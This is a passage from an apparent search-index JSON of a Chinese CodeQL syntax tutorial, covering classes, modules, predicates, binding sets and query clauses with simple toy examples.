\u5982\u679c\u4e00\u4e2a\u5b50\u7c7b\u7ee7\u627f\u4e86\u540c\u4e00\u4e2a\u8c13\u8bcd\u7684\u591a\u4e2a\u5b9a\u4e49\uff0c\u90a3\u4e48\u8be5\u7c7b\u8fd8\u9700\u8981\u624b\u52a8\u91cd\u5199\u8be5\u8c13\u8bcd\u4ee5\u907f\u514d\u6b67\u4e49\uff0c\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\u6211\u4eec\u53ef\u4ee5\u8003\u8651\u4f7f\u7528 super \u8868\u8fbe\u5f0f\uff0c\u4f8b\u5982: class Two extends OneTwo, TwoThree { override string getAString() { result = TwoThree.super.getAString() } } ### \u975e\u7ee7\u627f\u5b50\u7c7b(Non-extending subtypes) \u9664\u4e86\u4f7f\u7528\u5173\u952e\u5b57 extends \u4e4b\u5916\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u4f7f\u7528 instanceof \u6765\"\u7ee7\u627f\"\u7236\u7c7b\uff0c\u5c06\u4e00\u4e2a\u7c7b\u58f0\u660e\u4e3a instanceof Foo \u5927\u81f4\u7b49\u4ef7\u4e8e\u5728\u7279\u5f81\u8c13\u8bcd\u4e2d\u58f0\u660e\u4e86 this instanceof Foo \uff0c\u4e3b\u8981\u7684\u533a\u522b\u662f\u5176\u53ef\u4ee5\u901a\u8fc7super\u6765\u8c03\u7528\u7236\u7c7b\u7684\u65b9\u6cd5\u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728\u4f7f\u7528\u5173\u952e\u5b57 instanceof \"\u7ee7\u627f\"\u7236\u7c7b\u65f6\uff0c\u4f7f\u7528 override \u5173\u952e\u5b57\u91cd\u5199\u6210\u5458\u8c13\u8bcd\u4e0d\u4f1a\u5bf9\u7236\u7c7b\u9020\u6210\u5f71\u54cd\u3002 ## \u6a21\u5757(Modules) \u6a21\u5757\u63d0\u4f9b\u4e86\u4e00\u79cd\u901a\u8fc7\u5c06\u76f8\u5173\u7c7b\u578b\u3001\u8c13\u8bcd\u548c\u5176\u4ed6\u6a21\u5757\u7ec4\u5408\u5728\u4e00\u8d77\u6765\u7ec4\u7ec7 QL \u4ee3\u7801\u7684\u65b9\u6cd5\u3002 \u6211\u4eec\u53ef\u4ee5\u5c06\u6a21\u5757\u5bfc\u5165\u5230\u5176\u4ed6\u6587\u4ef6\u4e2d\uff0c\u8fd9\u6837\u53ef\u4ee5\u907f\u514d\u91cd\u590d\uff0c\u5e76\u6709\u52a9\u4e8e\u4ee3\u7801\u7ba1\u7406\u3002 ### \u6a21\u5757\u4e3b\u4f53 \u6a21\u5757\u4e2d\u5141\u8bb8\u5305\u542b\u4ee5\u4e0b\u7684\u7ed3\u6784: - \u5bfc\u5165\u6a21\u5757\u8bed\u53e5 - \u8c13\u8bcd - \u7c7b\u578b - \u522b\u540d - \u663e\u5f0f\u6a21\u5757 - select\u5b50\u53e5(\u4ec5\u53ef\u5728\u67e5\u8be2\u6a21\u5757\u4e2d\u4f7f\u7528) ### \u5b9a\u4e49\u6a21\u5757 \u76f4\u63a5\u4f7f\u7528\u5173\u952e\u5b57 module \u6765\u663e\u5f0f\u5b9a\u4e49\u4e00\u4e2a\u6a21\u5757\uff0c\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50(example.qll)\u5982\u4e0b: ``ql module Example { class OneTwoThree extends int { OneTwoThree() { this = 1 or this = 2 or this = 3 } } } ### \u5bfc\u5165\u6a21\u5757 \u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u5173\u952e\u5b57`import`\u5bfc\u5165\u6a21\u5757\uff0c\u8fd9\u4f1a\u5c06\u547d\u540d\u7a7a\u95f4\u4e2d\u7684\u6240\u6709\u540d\u79f0(\u9664\u79c1\u6709\u540d\u79f0\u5916)\u90fd\u5bfc\u5165\u5f53\u524d\u6a21\u5757\u7684\u547d\u540d\u7a7a\u95f4\u91cc\uff0c\u5bfc\u5165\u6a21\u5757\u8bed\u53e5\u7684\u5f62\u5f0f\u5982\u4e0b: ```ql import <module_expression1> as <name> import <module_expression2> \u8fd9\u76f8\u5f53\u4e8epython\u4e2d\u7684 from import *` \u6a21\u5757\u79cd\u7c7b # \u6587\u4ef6\u6a21\u5757 # \u6bcf\u4e2a\u67e5\u8be2\u6587\u4ef6(.ql)\u6216\u5e93\u6587\u4ef6(.qll)\u90fd\u9690\u5f0f\u5730\u5b9a\u4e49\u4e86\u4e00\u4e2a\u6a21\u5757\uff0c\u5176\u6a21\u5757\u540d\u4e0e\u6587\u4ef6\u540c\u540d\uff0c\u4f46\u6587\u4ef6\u4e2d\u7684\u4efb\u4f55\u7a7a\u683c\u90fd\u88ab\u8f6c\u6362\u4e3a\u4e0b\u5212\u7ebf \u5e93\u6a21\u5757 # \u5e93\u6a21\u5757\u7531.qll\u6587\u4ef6\u5b9a\u4e49\uff0c\u5b83\u53ef\u4ee5\u5305\u542b\u9664\u4e86select\u5b57\u53e5\u4e4b\u5916\u7684\u6a21\u5757\u4e3b\u4f53\u3002 \u67e5\u8be2\u6a21\u5757 # \u5e93\u6a21\u5757\u5b58\u5728\u4e8e\u5e93\u6587\u4ef6(.qll)\u4e2d\uff0c\u5b83\u53ef\u4ee5\u5305\u542b\u9664\u4e86select\u5b57\u53e5\u4e4b\u5916\u7684\u6a21\u5757\u4e3b\u4f53\u3002 \u67e5\u8be2\u6a21\u5757\u7531.ql\u6587\u4ef6\u5b9a\u4e49\u3002\u5b83\u53ef\u4ee5\u5305\u542b\u4ee5\u4e0b\u6a21\u5757\u4e3b\u4f53\u4e2d\u5217\u51fa\u7684\u4efb\u4f55\u5143\u7d20\u3002 \u67e5\u8be2\u6a21\u5757\u4e0e\u5176\u4ed6\u6a21\u5757\u7a0d\u6709\u4e0d\u540c: - \u65e0\u6cd5\u5bfc\u5165\u5176\u4ed6\u67e5\u8be2\u6a21\u5757 - \u4e00\u4e2a\u67e5\u8be2\u6a21\u5757\u5fc5\u987b\u5305\u542b\u4e00\u4e2a\u67e5\u8be2\uff0c\u5b83\u53ef\u4ee5\u662fselect\u8bed\u53e5\u6216\u8005\u4e00\u4e2a\u67e5\u8be2\u8c13\u8bcd \u663e\u5f0f\u6a21\u5757 # \u6211\u4eec\u8fd8\u53ef\u4ee5\u5728\u4e00\u4e2a\u6a21\u5757\u4e2d\u663e\u5f0f\u5730\u5b9a\u4e49\u53e6\u5916\u4e00\u4e2a\u6a21\u5757\u3002\u4f8b\u5982\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u4e0a\u8ff0\u7684\u4f8b\u5b50(example.qll)\u4e2d\u518d\u5b9a\u4e49\u4e00\u4e2a\u6a21\u5757\uff0c\u4f8b\u5b50\u5982\u4e0b: ... module M { class OneTwo extends OneTwoThree { OneTwo() { this = 1 or this = 2 } } }","title":"CodeQL\u8bed\u6cd5"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/codeql/2.CodeQL%E8%AF%AD%E6%B3%95/#2codeql\u8bed\u6cd5","text":"","title":"2.CodeQL\u8bed\u6cd5"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/codeql/2.CodeQL%E8%AF%AD%E6%B3%95/#\u524d\u8a00","text":"CodeQL\u7684\u5f88\u591a\u8bed\u6cd5\u548c\u73b0\u5728\u7684\u4e3b\u6d41\u9ad8\u7ea7\u8bed\u8a00\u6709\u5f88\u591a\u76f8\u4f3c\u4e4b\u5904\uff0c\u4f46\u4e5f\u6709\u8bb8\u591a\u7684\u4e0d\u540c\uff0c\u5b66\u4e60\u7684\u65f6\u5019\u9700\u8981\u6ce8\u610f\u3002 \u4e3e\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\uff0c\u5728CodeQL\u4e2d\u4e0d\u5b58\u5728 == \uff0c\u53ea\u6709 = \uff0c\u5f53\u4e00\u4e2a\u53d8\u91cf\u5b9a\u4e49\u4e86\u800c\u6ca1\u6709\u521d\u59cb\u5316\u7684\u65f6\u5019\uff0c = \u7684\u610f\u601d\u662f\u8d4b\u503c\uff0c\u4f46\u5f53\u5176\u5df2\u7ecf\u88ab\u8d4b\u503c\u4e86\u4e4b\u540e\uff0c = \u7684\u610f\u601d\u5c31\u53d8\u6210\u4e86\u6bd4\u8f83\u3002","title":"\u524d\u8a00"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/codeql/2.CodeQL%E8%AF%AD%E6%B3%95/#\u57fa\u7840\u6570\u636e\u7c7b\u578bprimitive-types","text":"CodeQL \u662f\u4e00\u79cd\u9759\u6001\u7c7b\u578b\u7684\u8bed\u8a00\uff0c\u56e0\u6b64\u6bcf\u4e2a\u53d8\u91cf\u90fd\u5fc5\u987b\u6709\u4e00\u4e2a\u58f0\u660e\u7684\u7c7b\u578b\u3002\u7c7b\u578b\u662f\u4e00\u7ec4\u503c\u3002\u4f8b\u5982\uff0cint \u7c7b\u578b\u662f\u4e00\u7ec4\u6574\u6570\u3002\u6ce8\u610f\uff0c\u4e00\u4e2a\u503c\u53ef\u4ee5\u5c5e\u4e8e\u8fd9\u4e9b\u96c6\u5408\u4e2d\u7684\u591a\u4e2a\uff0c\u8fd9\u610f\u5473\u7740\u5b83\u53ef\u4ee5\u6709\u591a\u4e2a\u7c7b\u578b\u3002 \u6574\u578b(int)\uff0c\u6d6e\u70b9\u578b(float)\uff0c\u65e5\u671f\u578b(date)\uff0c\u5b57\u7b26\u578b(stirng)\uff0c\u5e03\u5c14\u578b(boolean)\uff0c\u7b80\u5355\u4ecb\u7ecd\u4e0b\u65e5\u671f\u578b\u548c\u5e03\u5c14\u578b\u3002","title":"\u57fa\u7840\u6570\u636e\u7c7b\u578b(Primitive types)"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/codeql/2.CodeQL%E8%AF%AD%E6%B3%95/#\u65e5\u671f\u578bdate","text":"\u65e5\u671f\u578b\u53d8\u91cf\u7528\u4e8e\u4fdd\u5b58\u516c\u5386\u8868\u793a\u7684\u65f6\u95f4\u503c\u548c\u65e5\u671f\u503c\uff0c\u5982\u5e74\u3001\u6708\u3001\u65e5\u3001\u65f6\u3001\u5206\u3001\u79d2\u4ee5\u53ca\u6beb\u79d2\u7b49\uff0c\u6ce8\u610f\uff0c\u5b83\u4eec\u7684\u53d6\u503c\u90fd\u662f\u6574\u6570\u3002\u5176\u4e2d\uff0c\u8868\u793a\u5e74\u7684\u6574\u6570\u7684\u53d6\u503c\u8303\u56f4\u662f\u4ece-16777216\u523016777215\uff0c\u8868\u793a\u6708\u7684\u6574\u6570\u7684\u53d6\u503c\u8303\u56f4\u4e3a\u4ece0\u523011\uff0c\u8868\u793a\u65e5\u7684\u6574\u6570\u7684\u53d6\u503c\u8303\u56f4\u662f\u4ece1\u523031\uff0c\u8868\u793a\u65f6\u7684\u6574\u6570\u7684\u53d6\u503c\u8303\u56f4\u662f\u4ece0\u523023\uff0c\u8868\u793a\u5206\u7684\u6574\u6570\u7684\u53d6\u503c\u8303\u56f4\u662f\u4ece0\u523059\uff0c\u8868\u793a\u79d2\u7684\u6574\u6570\u7684\u53d6\u503c\u8303\u56f4\u662f\u4ece0\u523059\uff0c\u8868\u793a\u6beb\u79d2\u7684\u6574\u6570\u7684\u53d6\u503c\u8303\u56f4\u662f\u4ece0\u5230999\u3002 \u7f16\u5199\u4e00\u4e2a\u7b80\u5355\u7684\u5b9e\u4f8b\u7528\u4e8e\u8ba1\u7b97\u4ece\u4eca\u5e749\u67081\u65e5\u5230\u4eca\u5929(11\u67082\u65e5)\u4e00\u5171\u8fc7\u4e86\u591a\u4e45: from date start, date end where start = \"01/09/2021\".toDate() and end = \"02/11/2021\".toDate() select start.daysTo(end) \u8fd9\u91cc\u6211\u4eec\u7528\u5230\u4e86\u5b57\u7b26\u4e32\u7684\u4e00\u4e2a\u5185\u7f6e\u51fd\u6570 toDate() \uff0c\u66f4\u591a\u7684\u76f8\u5173\u51fd\u6570\u53ef\u4ee5\u67e5\u9605CodeQL\u6587\u6863 - string - go - date - go","title":"\u65e5\u671f\u578b(date)"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/codeql/2.CodeQL%E8%AF%AD%E6%B3%95/#\u5e03\u5c14\u578bboolean","text":"\u5e03\u5c14\u578b\u53d8\u91cf\u7528\u6765\u5b58\u653e\u5e03\u5c14\u503c\uff0c\u5373false\uff08\u5047\uff09\u6216\u8005 true\uff08\u771f\uff09\u3002 \u7f16\u5199\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\u6765\u5b9e\u73b0\u4e24\u4e2a\u5e03\u5c14\u4e4b\u95f4\u7684\u548c\u5173\u7cfb: from boolean a, boolean b where a = true and b = false select a.booleanAnd(b) \u66f4\u591a\u76f8\u5173\u51fd\u6570\u53ef\u4ee5\u67e5\u9605CodeQL\u6587\u6863 - boolean - go","title":"\u5e03\u5c14\u578b(boolean)"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/codeql/2.CodeQL%E8%AF%AD%E6%B3%95/#\u8c13\u8bcdpredicates","text":"\u8c13\u8bcd\u6709\u70b9\u7c7b\u4f3c\u4e8e\u5176\u4ed6\u8bed\u8a00\u4e2d\u7684\u51fd\u6570\uff0c\u4f46\u53c8\u4e0e\u51fd\u6570\u4e0d\u540c\uff0c\u8c13\u8bcd\u7528\u4e8e\u63cf\u8ff0\u6784\u6210 QL \u7a0b\u5e8f\u7684\u903b\u8f91\u5173\u7cfb\u3002\u786e\u5207\u7684\u8bf4\uff0c\u8c13\u8bcd\u63cf\u8ff0\u7684\u662f\u7ed9\u5b9a\u53c2\u6570\u4e0e\u5143\u7ec4\u96c6\u5408\u7684\u5173\u7cfb\u3002 \u5b9a\u4e49\u8c13\u8bcd\u6709\u4ee5\u4e0b\u51e0\u4e2a\u6ce8\u610f\u70b9(\u5751\u70b9): 1. \u9700\u8981\u6ce8\u610f\u7684\u662f\u8c13\u8bcd\u7684\u540d\u5b57\u5f00\u5934\u5fc5\u987b\u662f\u5c0f\u5199\u5b57\u6bcd\u3002 2. \u7ed1\u5b9a\u884c\u4e3a\u4e0e\u7ed1\u5b9a\u96c6\uff0c\u8fd9\u4e2a\u5728\u540e\u9762\u4f1a\u4ecb\u7ecd\u3002","title":"\u8c13\u8bcd(Predicates)"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/codeql/2.CodeQL%E8%AF%AD%E6%B3%95/#\u65e0\u7ed3\u679c\u8c13\u8bcd","text":"\u6ca1\u6709\u7ed3\u679c\u7684\u8c13\u8bcd\u4ee5predicate\u4f5c\u4e3a\u5f00\u5934\uff0c\u5269\u4e0b\u7684\u8bed\u6cd5\u7ed3\u6784\u7c7b\u4f3c\u4e8e\u5b9a\u4e49\u51fd\u6570\u3002\u8fd9\u79cd\u8c13\u8bcd\u53ea\u80fd\u5728where\u8bed\u53e5\u4e2d\u4f7f\u7528 \u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\u5982\u4e0b: predicate isCity(string city) { city = \"Beijing\" or city = \"ShangHai\" } from string city where city = \"Beijing\" and isCity(city) select city","title":"\u65e0\u7ed3\u679c\u8c13\u8bcd"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/codeql/2.CodeQL%E8%AF%AD%E6%B3%95/#\u7ed3\u679c\u8c13\u8bcd","text":"\u6709\u7ed3\u679c\u7684\u8c13\u8bcd\u7684\u5b9a\u4e49\u7c7b\u4f3c\u4e8ec/c++\u8bed\u8a00\u7684\u51fd\u6570\u5b9a\u4e49\uff0c\u4ee5\u8fd4\u56de\u7c7b\u578b\u66ff\u4ee3predicate\u4f5c\u4e3a\u5f00\u5934\u3002\u8fd9\u79cd\u8c13\u8bcd\u53ef\u4ee5\u5728where\u4e0eselect\u8bed\u53e5\u4e2d\u4f7f\u7528 \u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\u5982\u4e0b: int addOne(int i) { result = i + 1 and i in [1 .. 10] } from int v where v = 1 select addOne(v)","title":"\u7ed3\u679c\u8c13\u8bcd"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/codeql/2.CodeQL%E8%AF%AD%E6%B3%95/#\u9012\u5f52\u8c13\u8bcd","text":"\u8fd9\u91cc\u8bf4\u7684\u9012\u5f52\u5e76\u975e\u6211\u4eec\u5e38\u89c4\u7406\u89e3\u7684\u51fd\u6570\u9012\u5f52\uff0c\u6211\u4eec\u53ef\u4ee5\u7406\u89e3\u4e3a\u4e00\u4e2areverse(\u53ef\u53cd\u5411\u67e5\u627e\u7684)\u8c13\u8bcd\uff0c\u6216\u8005\u6362\u4e00\u4e2a\u601d\u7ef4\uff0c\u628a\u975e\u9012\u5f52\u7684\u7ed3\u679c\u8c13\u8bcd\u7406\u89e3\u4e3a\u4e00\u4e2a\u6709\u5411\u56fe\uff0c\u90a3\u4e48\u9012\u5f52\u7684\u7ed3\u679c\u8c13\u8bcd\u53ef\u4ee5\u7406\u89e3\u4e3a\u4e00\u4e2a\u65e0\u5411\u56fe\u3002 \u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\u5982\u4e0b: string getANeighbor(string country) { country = \"France\" and result = \"Belgium\" or country = \"France\" and result = \"Germany\" or country = \"Germany\" and result = \"Austria\" or country = \"Germany\" and result = \"Belgium\" or country = getANeighbor(result) } from string people where people = getANeighbor(\"Germany\") select people \u53ef\u4ee5\u770b\u5230\u67e5\u8be2\u5230\u4e09\u4e2a\u7ed3\u679c\uff0c France \uff0c Austria \uff0c Belgium \uff0c\u67e5\u8be2\u5230 France \u7684\u539f\u56e0\u5c31\u662f\u5b83\u53ef\u4ee5\u53cd\u5411\u67e5\u627e\u3002","title":"\u9012\u5f52\u8c13\u8bcd"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/codeql/2.CodeQL%E8%AF%AD%E6%B3%95/#\u7279\u5f81\u8c13\u8bcd\u975e\u6210\u5458\u8c13\u8bcd\u6210\u5458\u8c13\u8bcd","text":"\u8c13\u8bcd\u5206\u4e3a\u4e09\u79cd\uff0c\u5373\u975e\u6210\u5458\u8c13\u8bcd\u3001\u6210\u5458\u8c13\u8bcd\u548c\u7279\u5f81\u8c13\u8bcd\u3002 \u975e\u6210\u5458\u8c13\u8bcd\u662f\u5728\u7c7b\u4e4b\u5916\u5b9a\u4e49\u7684\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u5b83\u4eec\u4e0d\u662f\u4efb\u4f55\u7c7b\u7684\u6210\u5458\uff0c\u800c\u6210\u5458\u8c13\u8bcd\u5219\u662f\u5728\u7c7b\u91cc\u9762\u5b9a\u4e49\u7684\u3002\u7279\u5f81\u8c13\u8bcd\u5219\u662f\u7c7b\u4e2d\u7684\u7279\u6b8a\u8c13\u8bcd\uff0c\u7c7b\u4f3c\u4e8e\u5176\u4ed6\u8bed\u8a00\u4e2d\u7c7b\u7684\u6784\u9020\u51fd\u6570\u3002 \u4e0b\u9762\u662f\u6bcf\u79cd\u8c13\u8bcd\u7684\u793a\u4f8b\uff1a int getSuccessor(int i) { // 1. Non-member predicate result = i + 1 and i in [1 .. 9] } class FavoriteNumbers extends int { FavoriteNumbers() { // 2. Characteristic predicate this = 1 or this = 4 or this = 9 } string getName() { // 3. Member predicate for the class `FavoriteNumbers` this = 1 and result = \"one\" or this = 4 and result = \"four\" or this = 9 and result = \"nine\" } }","title":"\u7279\u5f81\u8c13\u8bcd\uff0c\u975e\u6210\u5458\u8c13\u8bcd\uff0c\u6210\u5458\u8c13\u8bcd"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/codeql/2.CodeQL%E8%AF%AD%E6%B3%95/#\u7ed1\u5b9a\u884c\u4e3a\u4e0e\u7ed1\u5b9a\u96c6","text":"\u8c13\u8bcd\u6240\u63cf\u8ff0\u7684\u96c6\u5408\u901a\u5e38\u4e0d\u5141\u8bb8\u662f\u65e0\u9650\u7684\uff0c\u6362\u53e5\u8bdd\u8bf4\uff0c\u8c13\u8bcd\u53ea\u80fd\u5305\u542b\u6709\u9650\u6570\u91cf\u7684\u5143\u7ec4(It must be possible to evaluate a predicate in a finite amount of time, so the set it describes is not usually allowed to be infinite. In other words, a predicate can only contain a finite number of tuples.) \u4e3e\u4e2a\u7b80\u5355\u7684\u6b63\u4f8b\u548c\u53cd\u4f8b: // \u6b63\u4f8b\uff0ci\u88ab\u9650\u5b9a\u57281\u523010\u5185\uff0c\u6216\u8005\u4f60\u4e5f\u53ef\u4ee5\u7ed9i\u8d4b\u4e00\u4e2a\u786e\u5b9a\u7684\u503c\u5982i=1 int addOne(int i) { result = i + 1 and i in [1 .. 10] } // \u53cd\u4f8b\uff0ci\u662f\u65e0\u9650\u6570\u91cf\u503c\u7684\uff0c\u6b64\u65f6CodeQL\u7f16\u8bd1\u5668\u4f1a\u62a5\u9519: 'i' is not bound to a value int addOne(int i) { result = i + 1 and i > 0 }","title":"\u7ed1\u5b9a\u884c\u4e3a\u4e0e\u7ed1\u5b9a\u96c6"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/codeql/2.CodeQL%E8%AF%AD%E6%B3%95/#\u5355\u4e2a\u7ed1\u5b9a\u96c6","text":"\u4e3a\u4e86\u4f7f\u4e0a\u8ff0\u7684\u53cd\u4f8b\u8c13\u8bcd\u80fd\u591f\u901a\u8fc7\u7f16\u8bd1\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u7ed1\u5b9a\u96c6(bindingset)\uff0c\u4f46\u662f\u5f53\u6211\u4eec\u53bb\u8c03\u7528\u8fd9\u4e2a\u8c13\u8bcd\u65f6\uff0c\u4f20\u9012\u7684\u53c2\u6570\u8fd8\u662f\u53ea\u80fd\u5728\u6709\u9650\u7684\u53c2\u6570\u96c6\u4e2d\u3002 \u4e0a\u9762\u7684\u53cd\u4f8b\u53ef\u4ee5\u4fee\u6539\u4e3a\u5982\u4e0b: bindingset[i] int addOne(int i) { result = i + 1 and i > 0 } // \u6b64\u65f6\u6211\u4eec\u53ef\u4ee5\u53bb\u8c03\u7528\u8fd9\u4e2a\u8c13\u8bcd\uff0c\u4f46\u662f\u9700\u8981\u6ce8\u610f\u4f20\u9012\u8fc7\u6765\u7684\u53c2\u6570\u8fd8\u662f\u53ea\u80fd\u5728\u6709\u9650\u7684\u53c2\u6570\u96c6\u4e2d from int i where i = 1 select addOne(i)","title":"\u5355\u4e2a\u7ed1\u5b9a\u96c6"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/codeql/2.CodeQL%E8%AF%AD%E6%B3%95/#\u591a\u4e2a\u7ed1\u5b9a\u96c6","text":"\u6211\u4eec\u540c\u6837\u53ef\u4ee5\u6dfb\u52a0\u591a\u4e2a\u7ed1\u5b9a\u96c6\uff0c\u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50: bindingset[x] bindingset[y] predicate plusOne(int x, int y) { x + 1 = y } \u8fd9\u4e2a\u7ed1\u5b9a\u96c6\u7684\u610f\u601d\u662f\u5982\u679cx\u6216y\u7ed1\u5b9a(bound)\u4e86\uff0c\u90a3\u4e48x\u548cy\u90fd\u7ed1\u5b9a\uff0c\u5373\u81f3\u5c11\u6709\u4e00\u4e2a\u53c2\u6570\u53d7\u5230\u7ea6\u675f\u3002 \u5982\u679c\u6211\u4eec\u60f3\u8981\u4e24\u8005\u90fd\u53d7\u7ea6\u675f\uff0c\u53ef\u4ee5\u5c06\u4f8b\u5b50\u4fee\u6539\u4e00\u4e0b: bindingset[x, y] predicate plusOne(int x, int y) { x + 1 = y } \u90a3\u4e48\u8fd9\u4e2a\u8c13\u8bcd\u5c31\u53d8\u4e3a\u4e86\u4e00\u4e2a\u7c7b\u4f3c\u4e8e\u6821\u9a8c\u7684\u51fd\u6570\uff0c\u5373 x+1 == y","title":"\u591a\u4e2a\u7ed1\u5b9a\u96c6"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/codeql/2.CodeQL%E8%AF%AD%E6%B3%95/#\u67e5\u8be2query","text":"\u67e5\u8be2\u662fCodeQL\u7684\u8f93\u51fa\u3002\u67e5\u8be2\u6709\u4e24\u79cd\u7c7b\u578b\uff0c\u5206\u522b\u662f - select\u5b50\u53e5 - \u67e5\u8be2\u8c13\u8bcd\uff0c\u8fd9\u610f\u5473\u7740\u6211\u4eec\u53ef\u4ee5\u5728\u5f53\u524d\u6a21\u5757\u4e2d\u5b9a\u4e49\u6216\u8005\u4ece\u5176\u4ed6\u6a21\u5757\u4e2d\u5bfc\u5165","title":"\u67e5\u8be2(Query)"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/codeql/2.CodeQL%E8%AF%AD%E6%B3%95/#select\u5b50\u53e5","text":"select\u5b50\u53e5\u7684\u683c\u5f0f\u5982\u4e0b: [from] /* ... variable declarations ... */ [where] /* ... logical formula ... */ select /* ... expressions ... */ \u5176\u4e2dfrom\u548cwhere\u8bed\u53e5\u662f\u53ef\u9009\u7684\u3002\u6211\u4eec\u53ef\u4ee5\u5728from\u4e2d\u5b9a\u4e49\u53d8\u91cf\uff0c\u5728where\u4e2d\u7ed9\u53d8\u91cf\u8d4b\u503c\u548c\u5bf9\u67e5\u8be2\u7ed3\u679c\u7684\u8fc7\u6ee4\uff0c\u6700\u540e\u5728select\u4e2d\u663e\u793a\u7ed3\u679c\u3002 \u5728select\u8bed\u53e5\u4e2d\u6211\u4eec\u8fd8\u53ef\u4ee5\u4f7f\u7528\u4e00\u4e9b\u5173\u952e\u5b57: - as \u5173\u952e\u5b57\uff0c\u540e\u9762\u8ddf\u968f\u4e00\u4e2a\u540d\u5b57\u3002\u4f5c\u7528\u76f8\u5f53\u4e8esql\u4e2d\u7684 as \uff0c\u4e3a\u7ed3\u679c\u5217\u63d0\u4f9b\u4e86\u4e00\u4e2a\"\u6807\u7b7e\"\uff0c\u5e76\u5141\u8bb8\u5728\u540e\u7eed\u7684select\u8868\u8fbe\u5f0f\u4e2d\u4f7f\u7528\u5b83\u4eec\u3002 - order by \u5173\u952e\u5b57\uff0c\u540e\u9762\u8ddf\u968f\u4e00\u4e2a\u4e00\u4e2a\u7ed3\u679c\u5217\u540d\u3002\u4f5c\u7528\u76f8\u5f53\u4e8esql\u4e2d\u7684 order by \uff0c\u7528\u4e8e\u6392\u5e8f\u7ed3\u679c\uff0c\u5e76\u4e14\u5728\u7ed3\u679c\u5217\u540d\u540e\u53ef\u9009 asc (\u5347\u5e8f)\u6216 desc (\u964d\u5e8f)\u5173\u952e\u5b57\u3002 \u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\u5982\u4e0b: from int x, int y where x = 3 and y in [0 .. 2] select x, y, x * y as product, \"product: \" + product","title":"select\u5b50\u53e5"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/codeql/2.CodeQL%E8%AF%AD%E6%B3%95/#\u67e5\u8be2\u8c13\u8bcd","text":"\u67e5\u8be2\u8c13\u8bcd\u662f\u4e00\u4e2a\u975e\u6210\u5458\u8c13\u8bcd\uff0c\u5e76\u5728\u6700\u5f00\u5934\u4f7f\u7528 query \u4f5c\u4e3a\u6ce8\u89e3\u3002\u5b83\u8fd4\u56de\u8c13\u8bcd\u8ba1\u7b97\u7ed3\u679c\u7684\u6240\u6709\u5143\u7ec4\uff0c\u4e0b\u9762\u662f\u4e00\u4e2a\u7b80\u5355\u7684\u793a\u4f8b: query int getProduct(int x, int y) { x = 3 and y in [0 .. 2] and result = x * y } \u5b83\u8fd4\u56de\u7684\u7ed3\u679c\u5982\u4e0b: \u7f16\u5199\u67e5\u8be2\u8c13\u8bcd\u800c\u4e0d\u662fselect\u5b50\u53e5\u7684\u597d\u5904\u662f\u6211\u4eec\u53ef\u4ee5\u5728\u4ee3\u7801\u7684\u5176\u4ed6\u90e8\u5206\u4e2d\u8c03\u7528\u8c13\u8bcd\u3002\u4f8b\u5982\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u7c7b\u4e2d\u7684\u7279\u5f81\u8c13\u8bcd\u5185\u90e8\u8c03\u7528: query int getProduct(int x, int y) { x = 3 and y in [0 .. 2] and result = x * y } class MultipleOfThree extends int { MultipleOfThree() { this = getProduct(_, _) } } from MultipleOfThree m select m \u8fd9\u6837\u6211\u4eec\u67e5\u8be2\u7ed3\u679c\u5c31\u67092\u4e2a\uff0c\u4e00\u4e2a\u662f\u5185\u7f6e\u7684 #select \uff0c\u4e00\u4e2a\u662f getProduct \uff0c #select 